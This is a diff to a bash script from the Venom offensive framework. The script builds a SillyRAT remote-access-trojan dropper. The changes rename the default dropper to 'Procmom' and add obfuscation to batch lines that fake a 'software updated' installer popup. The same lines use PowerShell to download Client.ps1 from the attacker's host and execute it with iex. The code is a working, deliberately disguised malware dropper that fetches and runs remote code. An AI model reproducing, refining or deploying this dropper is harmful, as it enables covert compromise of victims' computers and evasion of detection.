@@ -10274,7 +10274,7 @@ fi
 ## Store User Inputs (module bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Python3-Installer\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Procmom\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
@@ -10284,7 +10284,7 @@ if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="666";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$SOSP" ]; then SOSP="windows";fi
-if [ -z "$Drop" ]; then Drop="Python3-Installer";fi
+if [ -z "$Drop" ]; then Drop="Procmom";fi
 if [ "$SOSP" = "Windows" ]; then
    targetos="$SOSP"
    uploadpath="$rpath => (remote)"
@@ -13672,10 +13672,10 @@ FullName=$(echo "$Drop.$Ext"|cut -d '.' -f1|cut -d '-' -f2)
 if [ "$easter_egg" = "ON" ]; then
    echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
    echo ":: Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
-   echo "@echo off&%@i%&title pl%@#%ay.go%@i%og%_$%le.co%_[-1]%m - Up%@$%dat%@Q%ing S%@%of%@i%twa%@$%re %_$%Rep%@%osi%@%tor%@%ies." >> $IPATH/output/$Drop.$Ext
-   echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D IS_MIN%@$%IMI%,;f%ZE%i?%D se%@$%t IS_MIN%_#t%IMIZ%@=i%ED=1 &%@$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $IPATH/output/$Drop.$Ext
-   echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%@%eCt -Com^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"$FullName so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
-   echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll -w 1 \$My%@$%C\"a\"t=nE%@i%W-Obj%@%eCt -Co%@i%m Win\"H\"tt%@$%p.Wi^nH\"t\"tpReq%@i_%ue\"s\"t.5.1;\$MyC%@$%at.op%@f%en('G%@i%ET','ht%@D%t%[-1]%p://$lhost/Client.ps%@[0]%1',\$fal%LeD%se);\$My\"C\"at.se%@$%nd();iex \$My%@1b%Cat.r\"e\"s%@0$%pons%@?%e\"T\"e%@_i%xt;" >> $IPATH/output/$Drop.$Ext
+   echo "@echo off&%@i%&ti%@_$%tl^e p%_?%l%@#%ay.go%@i%og%'$%le.co%_[-1]%m - %_$%Up%@$%dat%@Q%in%_$%g S%@$%of%@i%twa%U1%re %_$%Rep%@%osi%@%tor%@%ie%('$')%s." >> $IPATH/output/$Drop.$Ext
+   echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D %@$%IS_MIN%@$%IMI%,;f%ZE%i?%D se%@'$%t IS_MIN%_#t%IM%'$%IZ%@=i%ED=1 &%@_$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $IPATH/output/$Drop.$Ext
+   echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%,;$%eC%'$%t -Co%()%m^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"$FullName so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Wi%@$%n%@%do%_$%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
+   echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll -w 1 \$My%@$%C\"a\"t=nE%@i%W-Obj%@%eC%('i')%t -Co%@i%m Win\"H\"tt%@$%p.Wi^nH\"t\"tpReq%@i_%ue\"s\"t.5.1;\$MyC%@$%at.op%@f%en('G%@i%ET','ht%@D%t%[-1]%p://$lhost/Client.ps%@[0]%1',\$fal%LeD%se);\$My\"C\"at.se%@$%nd();iex \$My%@1b%Cat.r\"e\"s%@0$%po%'$%ns%@?%e\"T\"e%@_i%xt;" >> $IPATH/output/$Drop.$Ext
    echo "=Exit" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Obfuscated Batch Dropper written to output.";sleep 1
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Spoofing Batch Dropper Extension ([${GreenF}OK${white}])${white}";sleep 2
